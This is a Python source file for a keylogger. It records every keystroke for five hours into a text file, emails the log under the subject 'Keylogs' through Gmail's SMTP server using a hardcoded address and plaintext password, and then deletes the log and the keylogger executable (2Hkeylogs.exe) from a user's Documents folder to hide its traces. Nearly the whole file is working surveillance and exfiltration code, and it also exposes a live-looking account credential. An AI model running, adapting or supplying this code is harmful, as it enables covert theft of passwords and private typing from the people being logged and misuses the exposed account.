import time
import keyboard
import os
import smtplib
from email.mime.text import MIMEText
file = open('results.txt','w')
def filewrite(text):
     file.write(text)
     file.flush()
now = time.time()
endtime = now + 18000
while True:
     if time.time() > endtime:
         break
     k = keyboard.read_key()
     data = str(k)
     if data == "KeyboardEvent(a down)":
          filewrite("a")
     if data == "KeyboardEvent(b down)":
          filewrite("b")
     if data == "KeyboardEvent(c down)":
          filewrite("c")
     if data == "KeyboardEvent(d down)":
          filewrite("d")
     if data == "KeyboardEvent(e down)":
          filewrite("e")
     if data == "KeyboardEvent(f down)":
          filewrite("f")
     if data == "KeyboardEvent(g down)":
          filewrite("g")
     if data == "KeyboardEvent(h down)":
          filewrite("h")
     if data == "KeyboardEvent(i down)":
          filewrite("i")
     if data == "KeyboardEvent(j down)":
          filewrite("j")
     if data == "KeyboardEvent(k down)":
          filewrite("k")
     if data == "KeyboardEvent(l down)":
          filewrite("l")
     if data == "KeyboardEvent(m down)":
          filewrite("m")
     if data == "KeyboardEvent(n down)":
          filewrite("n")
     if data == "KeyboardEvent(o down)":
          filewrite("o")
     if data == "KeyboardEvent(p down)":
          filewrite("p")
     if data == "KeyboardEvent(q down)":
          filewrite("q")
     if data == "KeyboardEvent(r down)":
          filewrite("r")
     if data == "KeyboardEvent(s down)":
          filewrite("s")
     if data == "KeyboardEvent(t down)":
          filewrite("t")
     if data == "KeyboardEvent(u down)":
          filewrite("u")
     if data == "KeyboardEvent(v down)":
          filewrite("v")
     if data == "KeyboardEvent(w down)":
          filewrite("w")
     if data == "KeyboardEvent(x down)":
          filewrite("x")
     if data == "KeyboardEvent(y down)":
          filewrite("y")
     if data == "KeyboardEvent(z down)":
          filewrite("z")
     if data == "KeyboardEvent(left ctrl down)":
          filewrite("\n")
          filewrite("[Ctrl]")
          filewrite("\n")
     if data == "KeyboardEvent(backspace down)":
          filewrite("\n")
          filewrite("[Backspace]")
          filewrite("\n")
     if data == "KeyboardEvent(esc down)":
          filewrite("\n")
          filewrite("[esc]")
          filewrite("\n")
     if data == "KeyboardEvent(left windows down)":
          filewrite("\n")
          filewrite("[windows]")
          filewrite("\n")
     if data == "KeyboardEvent(enter down)":
          filewrite("\n")
          filewrite("[enter]")
          filewrite("\n")
     if data == "KeyboardEvent(left alt down)":
          filewrite("\n")
          filewrite("[alt]")
          filewrite("\n")
     if data == "KeyboardEvent(caps lock down)":
          filewrite("\n")
          filewrite("[capslock]")
          filewrite("\n")
     if data == "KeyboardEvent(tab down)":
          filewrite("\n")
          filewrite("[tab]")
          filewrite("\n")
     if data == "KeyboardEvent(left shift down)":
          filewrite("\n")
          filewrite("[shift]")
          filewrite("\n")
     if data == "KeyboardEvent(` down)":
          filewrite("`")
     if data == "KeyboardEvent(1 down)":
          filewrite("1")
     if data == "KeyboardEvent(2 down)":
          filewrite("2")
     if data == "KeyboardEvent(3 down)":
          filewrite("3")
     if data == "KeyboardEvent(4 down)":
          filewrite("4")
     if data == "KeyboardEvent(5 down)":
          filewrite("5")
     if data == "KeyboardEvent(6 down)":
          filewrite("6")
     if data == "KeyboardEvent(7 down)":
          filewrite("7")
     if data == "KeyboardEvent(8 down)":
          filewrite("8")
     if data == "KeyboardEvent(9 down)":
          filewrite("9")
     if data == "KeyboardEvent(0 down)":
          filewrite("0")
     if data == "KeyboardEvent(- down)":
          filewrite("-")
     if data == "KeyboardEvent(= down)":
          filewrite("=")
     if data == "KeyboardEvent(\ down)":
          filewrite("\\")
     if data == "KeyboardEvent(] down)":
          filewrite("]")
     if data == "KeyboardEvent([ down)":
          filewrite("[")
     if data == "KeyboardEvent(; down)":
          filewrite(";")
     if data == "KeyboardEvent(' down)":
          filewrite("\"")
     if data == "KeyboardEvent(, down)":
          filewrite(",")
     if data == "KeyboardEvent(. down)":
          filewrite(".")
     if data == "KeyboardEvent(/ down)":
          filewrite("/")
     if data == "KeyboardEvent(space down)":
          filewrite(" ")
     if data == "KeyboardEvent(print screen down)":
          filewrite("\n")
          filewrite("[printscreen]")
          filewrite("\n")
     if data == "KeyboardEvent(right ctrl down)":
          filewrite("\n")
          filewrite("[ctrl]")
          filewrite("\n")
     if data == "KeyboardEvent(up down)":
          filewrite("\n")
          filewrite("[uparrow]")
          filewrite("\n")
     if data == "KeyboardEvent(down down)":
          filewrite("\n")
          filewrite("[downarrow]")
          filewrite("\n")
     if data == "KeyboardEvent(left down)":
          filewrite("\n")
          filewrite("[leftarrow]")
          filewrite("\n")
     if data == "KeyboardEvent(right down)":
          filewrite("\n")
          filewrite("[rightarrow]")
          filewrite("\n")
     if data == "KeyboardEvent(page down down)":
          filewrite("\n")
          filewrite("[pagedown]")
          filewrite("\n")
     if data == "KeyboardEvent(page up down)":
          filewrite("\n")
          filewrite("[pageup]")
          filewrite("\n")
     if data == "KeyboardEvent(right shift down)":
          filewrite("\n")
          filewrite("[shift]")
          filewrite("\n")
     if data == "KeyboardEvent(backspace down)":
          filewrite("\n")
          filewrite("[backspace]")
          filewrite("\n")
     if data == "KeyboardEvent(delete down)":
          filewrite("\n")
          filewrite("[delete]")
          filewrite("\n")
     if data == "KeyboardEvent(home down)":
          filewrite("\n")
          filewrite("[home]")
          filewrite("\n")
     if data == "KeyboardEvent(end down)":
          filewrite("\n")
          filewrite("[end]")
          filewrite("\n")
     if data == "KeyboardEvent(f1 down)":
          filewrite("\n")
          filewrite("[f1]")
          filewrite("\n")
     if data == "KeyboardEvent(f2 down)":
          filewrite("\n")
          filewrite("[f2]")
          filewrite("\n")
     if data == "KeyboardEvent(f3 down)":
          filewrite("\n")
          filewrite("[f3]")
          filewrite("\n")
     if data == "KeyboardEvent(f4 down)":
          filewrite("\n")
          filewrite("[f4]")
          filewrite("\n")
     if data == "KeyboardEvent(f5 down)":
          filewrite("\n")
          filewrite("[f5]")
          filewrite("\n")
     if data == "KeyboardEvent(f6 down)":
          filewrite("\n")
          filewrite("[f6]")
          filewrite("\n")
     if data == "KeyboardEvent(f7 down)":
          filewrite("\n")
          filewrite("[f7]")
          filewrite("\n")
     if data == "KeyboardEvent(f8 down)":
          filewrite("\n")
          filewrite("[f8]")
          filewrite("\n")
     if data == "KeyboardEvent(f9 down)":
          filewrite("\n")
          filewrite("[f9]")
          filewrite("\n")
     if data == "KeyboardEvent(f10 down)":
          filewrite("\n")
          filewrite("[f10]")
          filewrite("\n")
     if data == "KeyboardEvent(f11 down)":
          filewrite("\n")
          filewrite("[f11]")
          filewrite("\n")
     if data == "KeyboardEvent(f12 down)":
          filewrite("\n")
          filewrite("[f12]")
          filewrite("\n")
file.close
fp = open('results.txt', 'r')
msg = MIMEText(fp.read())
fp.close()
mail = smtplib.SMTP('smtp.gmail.com', 587)
mail.ehlo()
mail.starttls()
me = 'ryannealyworms@gmail.com'
you = 'incongnitoanonymous@gmail.com'
msg['Subject'] = 'Keylogs'
msg['From'] = me
msg['To'] = you

# Send the message via our own SMTP server, but don't include the
# envelope header.
mail.login('ryannealyworms@gmail.com', 'thomas00')
mail.sendmail(me, you, msg.as_string())
mail.quit()
os.remove(r"C:\users\labuser\documents\test.txt")
os.remove(r"C:\users\labuser\documents\2Hkeylogs.exe")
